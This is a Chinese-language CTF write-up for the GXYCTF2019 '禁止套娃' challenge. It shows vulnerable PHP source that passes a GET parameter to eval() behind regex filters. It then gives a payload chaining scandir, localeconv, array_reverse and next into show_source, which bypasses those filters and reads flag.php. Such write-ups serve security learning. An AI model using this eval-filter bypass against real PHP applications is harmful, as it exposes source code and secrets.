---
title: "[GXYCTF2019]禁止套娃"
date: 2020-03-16
tags: [CTF, WP]
categories:
- [CTF, WP]
comments: false
---

# [GXYCTF2019]禁止套娃

## 知识点

```
localeconv() 函数返回一包含本地数字及货币格式信息的数组。
scandir() 列出 images 目录中的文件和目录。
readfile() 输出一个文件。
current() 返回数组中的当前单元, 默认取第一个值。
pos() current() 的别名。
next() 函数将内部指针指向数组中的下一个元素，并输出。
array_reverse()以相反的元素顺序返回数组。
highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。
show_source() 显示文件内容
```

<!-- more -->

## WP

img后面的参数base32,base63,hex解码得555.png

index.php hex,base64,base32编码传参img在网页源代码img标签解码base64得到源码

```
<?php
include "flag.php";
echo "flag在哪里呢？<br>";
if(isset($_GET['exp'])){
    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {
        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {
            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {
                // echo $_GET['exp'];
                @eval($_GET['exp']);
            }
            else{
                die("还差一点哦！");
            }
        }
        else{
            die("再好好想想！");
        }
    }
    else{
        die("还想读flag，臭弟弟！");
    }
}
// highlight_file(__FILE__);
?>
```

### payload

```
?exp=show_source(next(array_reverse(scandir(current(localeconv())))));
```

主要利用点`pos(localeconv())`或者`current(localeconv())`变成`.`

`array_reverse`数组反转

`next`将指针指向第二个,为flag.php